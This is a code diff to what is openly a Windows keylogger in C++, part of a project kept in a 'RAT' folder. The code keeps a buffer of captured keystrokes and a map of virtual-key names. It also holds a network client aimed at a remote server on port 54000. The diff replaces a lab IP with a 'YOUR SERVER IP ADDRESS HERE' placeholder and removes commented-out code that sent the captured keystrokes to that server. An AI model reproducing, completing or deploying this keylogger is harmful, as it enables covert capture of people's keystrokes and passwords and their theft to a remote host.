@@ -10,7 +10,7 @@
 #include <vector>
 #include <sstream>
 #include <winuser.h>
-#include <C:\Users\thelab\development\RAT\network.h> //Need to include your path-> How to fix this?  
+#include <C:\Users\thelab\development\RAT\network.h> //IMPORTENT! Need to include your LOCAL ABSOLUTE PATH to the network.h file. -> How to fix this?  
 #include <locale>
 #include <codecvt>
 #include <windows.h>
@@ -20,8 +20,10 @@ std::vector<std::pair<std::string, std::wstring>> keystrokeVector;
 std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> converter; //Convert wstring to string
 std::unordered_map<DWORD, bool> keyStates;
 std::mutex bufferMutex; 
-NetworkClient client("192.168.56.101", 54000); 
+NetworkClient client("XXX.XXX.XX.XXX", 54000); // YOUR SERVER IP ADDRESS HERE. 
 
+
+// #TODO Mapping some of the VK-codes, not done. 
 std::unordered_map<DWORD, std::wstring> VirtualKeyMap = {
     {VK_CAPITAL, L"[CAPS LOCK]"},
     {VK_BACK, L"[BACKSPACE]"}, //
@@ -90,22 +92,6 @@ void PeriodicVectorFlush() {
         }
         
         WriteVectorToFile();
-
-        // bool connected = false;
-
-        // if (client.connectToServer()) {
-        //     connected = true;
-
-        //     if (!SendVectorToServer()) {
-        //         std::cerr << "Failed to send data to server! \n";
-        //     }
-        // }
-            
-        // else {
-        //     std::cerr << "Failed to connect to server! \n";
-        // }
-
-
     }
 }
 
